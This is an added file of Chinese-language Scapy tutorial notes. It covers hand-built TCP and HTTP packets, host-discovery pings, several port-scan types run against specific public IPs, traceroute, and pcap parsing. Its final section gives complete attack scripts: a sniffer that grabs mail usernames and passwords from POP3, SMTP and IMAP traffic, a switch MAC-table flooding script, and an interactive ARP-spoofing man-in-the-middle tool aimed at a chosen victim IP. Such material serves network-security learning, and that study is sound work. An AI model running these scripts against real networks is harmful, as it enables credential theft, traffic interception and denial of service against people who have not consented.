@@ -1,0 +1,482 @@
+Scapy – 如何在数据包级创建一个HTTP GET请求
+
+从您的SYN数据包开始：
+>>> syn = IP(dst='www.google.com') / TCP(dport=80, flags='S')
+>>> syn
+<IP  frag=0 proto=tcp dst=Net('www.google.com') |<TCP  dport=www flags=S |>>
+
+然后从服务器接收SYN-ACK数据包，sr1工作。然后发送您的HTTP GET请求：
+>>> syn_ack = sr1(syn)
+Begin emission:
+Finished to send 1 packets.
+*
+Received 1 packets, got 1 answers, remaining 0 packets
+
+>>> syn_ack
+<IP  version=4L ihl=5L tos=0x0 len=44 id=424 flags= frag=0L ttl=55 proto=tcp chksum=0x2caa src=74.125.226.148 dst=10.20.30.40 options=[] |<TCP  sport=www dport=ftp_data seq=3833491143 ack=1 dataofs=6L reserved=0L flags=SA window=5720 chksum=0xd8b6 urgptr=0 options=[('MSS', 1430)] |<Padding  load='\x00\x00' |>>>
+
+然后设置您的TCP序列号和Ack号码并发送GET：
+getStr = 'GET / HTTP/1.1\r\nHost: www.google.com\r\n\r\n'
+request = IP(dst='www.google.com') / TCP(dport=80, sport=syn_ack[TCP].dport,seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A') /getStr
+reply = sr1(request)
+
+
+使用只有HTTP的Scapy过滤数据包
+>>>import scapy.all as S
+>>> S.load_layer("http")
+>>> HTTPRequest
+<class 'scapy.layers.http.HTTPRequest'>
+>>>def filter_get_requests(pkg):
+    return pkg.haslayer(HTTPRequest) and pkg[HTTPRequest].Method==b'GET'
+
+>>> s = S.sniff(lfilter=filter_get_requests) 
+
+有.haslayer函数和一些解析：
+
+methods=['GET','POST','HEAD','PUT','DELETE','CONNECT','OPTIONS','TRACE']#Define http methods
+s=sniff(1)#sniff one packet to parse you can put this in a loop
+a=[]
+a.append(s[0])
+if a[0].haslayer(TCP):#Checks for TCP protocol
+ if a[0].dport == 80:#Checks for http port 80
+  if a[0].haslayer(Raw):#Checks if packet has payload
+   r=a[0][0][Raw].load
+   for i in methods:#Checks if any of the http methods are present in load, if there are it prints to screen
+    if i in r:
+     print r
+
+#!/usr/bin/python
+from scapy.all import *
+def http_header(packet):
+        http_packet=str(packet)
+        if http_packet.find('GET'):
+                return GET_print(packet)
+def GET_print(packet1):
+    ret = "***************************************GET PACKET****************************************************\n"
+    ret += "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
+    ret += "*****************************************************************************************************\n"
+    return ret
+sniff(iface='eth0',prn=http_header,filter="tcp port 80")
+
+更简洁地实现：
+#!/usr/bin/python
+from scapy.all import *
+stars = lambda n: "*" * n
+def GET_print(packet):
+    return "\n".join((
+        stars(40) + "GET PACKET" + stars(40),"\n".join(packet.sprintf("{Raw:%Raw.load%}").split(r"\r\n")),stars(90)))
+sniff(
+    iface='eth0',prn=GET_print,lfilter=lambda p: "GET" in str(p),filter="tcp port 80")
+
+
+packets = rdpcap('lo.pcap')
+
+for packet in packets:
+    if not packet.haslayer('HTTPRequest'):
+        continue
+    http_layer= packet.getlayer('HTTPRequest').fields
+    ip_layer = packet.getlayer('IP').fields
+    print('\n{0[src]} just requested a {1[Method]} {1[Host]}{1[Path]}'.format(ip_layer,http_layer))
+
+Scapy高级使用(一)
+https://cloud.tencent.com/developer/article/1838835
+TCP SYN Ping
+发送仅设置了SYN的空TCP数据包。
+SYN/ACK或RST响应表示机器已启动并正在运行。
+>>> ans,unans=sr(IP(dst="60.205.177.0/28")/TCP(dport=80,flags="S"))
+Begin emission:
+Finished sending 16 packets.
+.*********..................................................................................^C
+Received 92 packets, got 9 answers, remaining 7 packets
+>>> ans.summary(lambda s:s[1].sprintf("%IP.src% is alive"))
+
+TCP ACK Ping
+发送仅设置了ACK位的空TCP数据包。
+未经请求的ACK数据包应通过RST进行响应，RST显示一台机器。
+SYN-ping和ACK-ping看起来可能是多余的，但是大多数无状态防火墙不会过滤未经请求的ACK数据包，所以最好同时使用这两种ping技术。
+>>> ans, unans = sr(IP(dst='60.205.177.90-105')/TCP(dport=80, flags='A'))
+Begin emission:
+Finished sending 16 packets.
+.*.******....................................................................................................................................................................^C
+Received 173 packets, got 7 answers, remaining 9 packets
+>>> ans.summary(lambda s:s[1].sprintf("{IP: %IP.src% is alive}"))
+
+UDP Ping
+将UDP数据包发送给给定的端口（无论是否带有有效载荷），协议特定的有效载荷会使扫描更加有效。
+选择最有可能关闭的端口（开放的UDP端口可能会收到空数据包，但会忽略它们）。
+ICMP端口不可达表示机器是启动的。
+>>> ans, unans = sr(IP(dst='60.205.177.100-254')/UDP(dport=90),timeout=0.1)
+Begin emission:
+Finished sending 155 packets.
+..******..*****...
+Received 18 packets, got 11 answers, remaining 144 packets
+>>> ans.summary(lambda s:s[1].sprintf("%IP.src% is unreachable"))
+60.205.177.106 is unreachable
+
+ARP Ping
+在同一网络/ LAN上探测存活主机时，可以使用ARP Ping。
+更快，更可靠，因为它仅通过ARP在第2层上运行。
+ARP是任何第2层通信的骨干协议
+由于在 IPv6 中没有 ARP协议，所以在 IPv6 上层定义了 NDP 协议实现 ARP 的地址解析，冲突地址检测等功能以及IPV6 的邻居发现功能。
+>>>  ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="172.17.51.0/24"),timeout=2)
+Begin emission:
+Finished sending 256 packets.
+*******************************************************************************.***********************************************************************************...........................
+Received 190 packets, got 162 answers, remaining 94 packets
+>>> ans.summary(lambda r: r[0].sprintf("%Ether.src% %ARP.pdst%") )
+00:16:3e:0c:d1:ad 172.17.51.0
+
+ICMP Ping
+ICMP扫描涉及无处不在的_ping程序_发送的标准数据包。
+向目标IP发送一个ICMP类型8（回显请求）数据包，收到一个ICMP类型0（回显应答）的包表示机器存活。
+现在许多主机和防火墙阻止这些数据包，因此基本的ICMP扫描是不可靠的。
+ICMP还支持时间戳请求和地址掩码请求，可以显示计算机的可用性。
+>>>  ans,unans=sr(IP(dst="60.205.177.168-180")/ICMP())
+>>> ans.summary(lambda s:s[0].sprintf("{IP: %IP.dst% is alive}"))
+ 60.205.177.168 is alive
+
+在Scapy中制作三次握手包
+第1步-将客户端的SYN发送到侦听服务器
+
+使用源IP地址和目标IP地址制作一个IP头。
+制作一个TCP标头，在其中生成TCP源端口，设置服务器侦听的目标端口，设置TCP的flag SYN，并生成客户端的seq。
+ip=IP(src="192.168.2.53", dst="60.205.177.168")
+syn_packet = TCP(sport=1500, dport=80, flags="S", seq=100)
+第2步-监听服务器的响应（SYN-ACK）
+
+保存服务器的响应。
+获取服务器的TCP序列号，并将该值加1。
+synack_packet = sr1(ip/syn_packet)
+my_ack = synack_packet.seq+1
+第3步从客户端发送对服务器响应的确认（ACK）
+
+IP标头与初始SYN数据包具有相同的源和目标。
+TCP报头具有与syn数据包相同的TCP源端口和目标端口，仅设置ACK位，由于SYN数据包消耗一个序列号，因此将客户端的ISN递增1，将确认值设置为递增的服务器的序列号值。
+ack_packet = TCP(sport=1500, dport=80, flags="A", seq=101, ack=my_ack)
+send(ip/ack_packet)
+完整代码如下
+
+#!/usr/bin/python
+
+from scapy.all import *
+# 构建payload
+get='GET / HTTP/1.0\n\n'
+#设置目的地址和源地址
+ip=IP(src="192.168.2.53",dst="60.205.177.168")
+# 定义一个随机源端口
+port=RandNum(1024,65535)
+# 构建SYN的包
+SYN=ip/TCP(sport=port, dport=80, flags="S", seq=42)
+# 发送SYN并接收服务器响应（SYN,ACK）
+SYNACK=sr1(SYN)
+#构建确认包
+ACK=ip/TCP(sport=SYNACK.dport,dport=80,flags="A",seq=SYNACK.ack,ack=SYNACK.seq+1)/get
+#发送ack确认包
+reply,error=sr(ACK)
+# 打印响应结果
+print(reply.show())
+
+SYN扫描
+SYN扫描也称为半开放扫描。可以使用这种策略来确定通信端口的状态而无需建立完整的连接。客户端首先向被测主机发送一个syn数据包，
+如果端口开放，那么服务端会响应一个syn+ack的数据包，之后客户端会发送rst数据包进行重置。否则服务端会直接响应一个rst包，
+表示端口没有开放。如果我们发了大量的syn包而不去确认，服务端会继续发送syn+ack的包，会不断的消耗服务器的CPU和内存，
+这也就是我们常说的syn泛洪攻击了。
+
+在单个主机，单个端口上进行SYN扫描
+使用sr1功能发送并响应数据包
+使用sprintf方法在响应中打印字段。（“ SA”标志表示开放的端口，“ RA”标志表示关闭的端口）
+>>> syn_packet = IP(dst='60.205.177.168')/TCP(dport=22,flags='S')
+>>> rsp=sr1(syn_packet)
+Begin emission:
+Finished sending 1 packets.
+..*
+Received 3 packets, got 1 answers, remaining 0 packets
+>>> rsp.sprintf("%IP.src%  %TCP.sport%  %TCP.flags%")
+'60.205.177.168  ssh  SA'
+在单个主机，多个端口上进行SYN扫描
+>>> ans,unans=sr(IP(dst="60.205.177.168")/TCP(dport=(20,22),flags="S"))
+Begin emission:
+Finished sending 3 packets.
+..*..**
+Received 7 packets, got 3 answers, remaining 0 packets
+>>> ans.summary(lambda s:s[1].sprintf("%TCP.sport%  %TCP.flags%" ))
+ftp_data  RA
+ftp  RA
+ssh  SA
+
+
+对多个主机，多个端口进行SYN扫描
+make_table接受三个值，行，列和表数据。（在下面的示例中，目标IP位于x轴上，目标端口位于y轴上，响应中的TCP标志是表格数据）
+60.205.177.169的20和22端口没有响应数据包，猜测中间可能有设备（防火墙）给拦下了。
+
+>>> ans,unans = sr(IP(dst=["60.205.177.168-170"])/TCP(dport=[20,22,80],flags="S"))
+Begin emission:
+Finished sending 9 packets.
+..*..**..*.................................................................................................................................................................................................................................................^C
+Received 251 packets, got 4 answers, remaining 5 packets
+>>> ans.make_table(lambda s: (s[0].dst, s[0].dport,s[1].sprintf("%TCP.flags%")))
+   60.205.177.168 60.205.177.169 
+20 RA             -              
+22 SA             -              
+80 SA             SA 
+
+Fin 扫描
+客户端会发送带有fin标志（关闭连接）的数据包到服务端，当服务端没有响应时，表示端口是开放状态，否则会收到rst的包。
+
+
+
+端口开放
+>>> fin_packet = IP(dst='60.205.177.168')/TCP(dport=4444,flags='F')
+>>> resp = sr1(fin_packet)
+Begin emission:
+Finished to send 1 packets.
+^C
+Received 0 packets, got 0 answers, remaining 1 packets
+端口关闭
+>>> fin_packet = IP(dst='60.205.177.168')/TCP(dport=4399,flags='F')
+>>> resp = sr1(fin_packet)
+>>> resp.sprintf('%TCP.flags%')
+'RA'
+
+
+NULL 扫描
+null扫描会发送一个没有设置任何flag的TCP数据包，当收到rst的响应包则表示端口关闭，否则表示端口开放，如果收到类型为3且代码
+为1、2、3、9、10或13的ICMP错误表示该端口已被过滤，获取不到端口状态。
+>>> null_scan_resp = sr1(IP(dst="60.205.177.168")/TCP(dport=4399,flags=""),timeout=1)
+>>> null_scan_resp.sprintf('%TCP.flags%')
+'RA'
+
+Xmas 扫描
+XMAS扫描会发送带有URG，PUSH，FIN标志的TCP数据包，如果未接收到任何数据包，则认为该端口处于打开状态；如果接收到RST数据包，
+则将该端口视为已关闭。如果收到类型为3且代码为1、2、3、9、10或13的ICMP错误表示该端口已被过滤，获取不到端口状态
+
+端口关闭
+>>> xmas_scan_resp=sr1(IP(dst="60.205.177.168")/TCP(dport=4399,flags=”FPU”),timeout=1)
+Begin emission:
+.Finished sending 1 packets.
+*
+Received 2 packets, got 1 answers, remaining 0 packets
+>>> xmas_scan_resp.sprintf('%TCP.flags%')
+'RA'
+
+
+UDP扫描
+UDP扫描最常见于检测DNS，SNMP和DHCP服务。客户端会发送带有要连接的端口号的UDP数据包。如果服务器使用UDP数据包响应客户端，
+那么该端口在服务器上是开放的。如果返回ICMP端口不可达的类型为3和code为3错误数据包，表示该端口在服务器是关闭状态。
+
+>>> udp_scan=sr1(IP(dst="60.205.177.168")/UDP(dport=53),timeout=1))
+跟踪路由
+跟踪路由技术基于IP协议的设计方式。IP标头中的TTL值被视为跳数限制。每当路由器收到要转发的数据包时，它将TTL减1并转发数据包。当TTL达到0时，路由器将向源计算机发送答复，表示数据包已被丢弃。
+各种工具背后的技术是相同的，但是实现它们的方式略有不同。Unix系统使用UDP数据报文，而Windows tracert则发送ICMP请求，Linux的tcptraceroute使用TCP协议。
+使用ICMP进行路由跟踪
+>>> ans,unans=sr(IP(dst="49.232.152.189",ttl=(1,10))/ICMP())
+Begin emission:
+Finished sending 10 packets.
+*****.**........................................................................................................^C
+Received 112 packets, got 7 answers, remaining 3 packets
+>>> ans.summary(lambda s:s[1].sprintf("%IP.src%"))
+10.36.76.142
+10.54.138.21
+10.36.76.13
+45.112.216.134
+103.216.40.18
+9.102.250.221
+10.102.251.214
+
+使用tcp进行路由跟踪
+>>> ans,unans=sr(IP(dst="baidu.com",ttl=(1,10))/TCP(dport=53,flags="S"))
+Begin emission:
+Finished sending 10 packets.
+*********......................^C
+Received 31 packets, got 9 answers, remaining 1 packets
+>>> ans.summary(lambda s:s[1].sprintf("%IP.src% {ICMP:%ICMP.type%}"))
+10.36.76.142 time-exceeded
+10.36.76.13 time-exceeded
+10.102.252.130 time-exceeded
+
+Scapy包含一个内置的traceroute()函数可以实现与上面相同的功能
+
+>>> traceroute("baidu.com")
+Begin emission:
+Finished sending 30 packets.
+************************
+Received 24 packets, got 24 answers, remaining 6 packets
+   220.181.38.148:tcp80 
+2  10.36.76.13     11   
+3  10.102.252.34   11   
+4  117.49.35.138   11   
+
+使用DNS跟踪路由
+我们可以通过在traceroute()函数的l4参数中指定完整的数据包来执行DNS跟踪路由
+
+>>> ans,unans=traceroute("60.205.177.168",l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname="thesprawl.org")))
+Begin emission:
+****Finished sending 30 packets.
+.................
+Received 21 packets, got 4 answers, remaining 26 packets
+  60.205.177.168:udp53 
+1 10.2.0.1        11   
+2 114.242.29.1    11   
+
+Scapy高级使用（二）
+
+
+获取pcap文件中的ip
+from __future__ import print_function
+from sys import argv
+from scapy.all import rdpcap, IP
+
+def help_text():
+    print("Usage: python all_devices.py path_to_pcap")
+    sys.exit()
+
+def extract_host_names(pcap):
+    machines = []
+    packets = rdpcap(pcap)
+    for i in range(len(packets)):
+             if packets[i].haslayer(IP) !=1:
+                continue
+             if packets[i][IP].src not in machines:
+                 machines.append(packets[i][IP].src)
+                 print(len(machines), packets[i][IP].src)
+             elif packets[i][IP].dst not in machines:
+                 machines.append(packets[i][IP].dst)
+                 print(len(machines), packets[i][IP].dst)
+    return machines
+
+if __name__ == '__main__':
+    pcap = argv[1]
+    if len(argv) < 2:
+        help_text()
+    print("\nList of all the hosts in pcap =>", extract_host_names(pcap),end="\n\n")
+
+
+嗅探mail上的用户名密码
+from scapy.all import *
+
+def packet_callback(packet):
+    if packet[TCP].payload:
+        mail_packet = str(packet[TCP].payload)
+
+        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
+            print ("[*] Server: %s" % packet[IP].dst)
+            print ("[*] %s" % packet[TCP].payload)
+
+
+sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
+
+
+使用syn数据包探测存活主机
+from __future__ import print_function        
+from scapy.all import IP, TCP, sr1, sr        
+import sys
+import logging                                 
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+
+
+def help_text():
+    print("\nUsage:\n python hd_tcp_syn.py network_range\n")
+    sys.exit()
+        
+def host_discovery(network_range):
+    ans,unans=sr( IP(dst=network_range)/TCP(dport=80,flags="S"),verbose=0,timeout=1)
+    ans.summary(lambda(s,r):r.sprintf("\n %IP.src% is alive\n"))
+
+
+if __name__ == '__main__':
+    if len(sys.argv) < 2:
+        help_text()
+    network_range = sys.argv[1]
+    host_discovery(network_range)
+
+交换机MAC地址表泛洪攻击
+关于交换机mac泛洪原理之前文章也有介绍过局域网安全攻防
+
+from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp
+
+
+def generate_packets():
+    #初始化数据包列表
+    packet_list = [] 
+    #用一万个随机以太网数据包填充packet_list
+    for i in xrange(1,10000):
+        packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
+        packet_list.append(packet)
+
+def cam_overflow(packet_list):
+    sendp(packet_list, iface='eth0')
+
+
+if __name__ == '__main__':
+    packet_list = generate_packets()
+    cam_overflow(packet_list)
+
+ARP中间人欺骗攻击
+关于arp欺骗原理之前文章也有介绍过局域网安全攻防
+
+from scapy.all import *
+import sys
+import os
+import time
+
+try:
+ interface = raw_input("[*] Enter  Interface: ")
+ victimIP = raw_input("[*] Enter Victim IP: ")
+ gateIP = raw_input("[*] Enter Router IP: ")
+except KeyboardInterrupt:
+ print ("\n[*] User Requested Close")
+ print ("[*] Exiting...")
+ sys.exit(1)
+
+print ("\n[*] Enabling IP Forwarding...\n")
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+def get_mac(IP):
+ conf.verb = 0
+ ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+ for snd,rcv in ans:
+  return rcv.sprintf(r"%Ether.src%")
+
+def reARP():
+ 
+ print ("\n[*] Restoring Targets...")
+ victimMAC = get_mac(victimIP)
+ gateMAC = get_mac(gateIP)
+ send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
+ send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
+ print ("[*] Shutting Down...")
+ sys.exit(1)
+
+def trick(gm, vm):
+ send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
+ send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
+
+def mitm():
+ try:
+  victimMAC = get_mac(victimIP)
+ except Exception: 
+  print ("[!] Couldn't Find Victim MAC Address")
+  print ("[!] Exiting...")
+  sys.exit(1)
+ try:
+  gateMAC = get_mac(gateIP)
+ except Exception: 
+  print ("[!] Couldn't Find Gateway MAC Address")
+  print ("[!] Exiting...")
+  sys.exit(1)
+ print ("[*] Poisoning Targets...")
+ while 1:
+  try:
+   trick(gateMAC, victimMAC)
+   time.sleep(1.5)
+  except KeyboardInterrupt:
+   reARP()
+   break
+
+if __name__ == '__main__':
+    mitm()
+
+
+
+
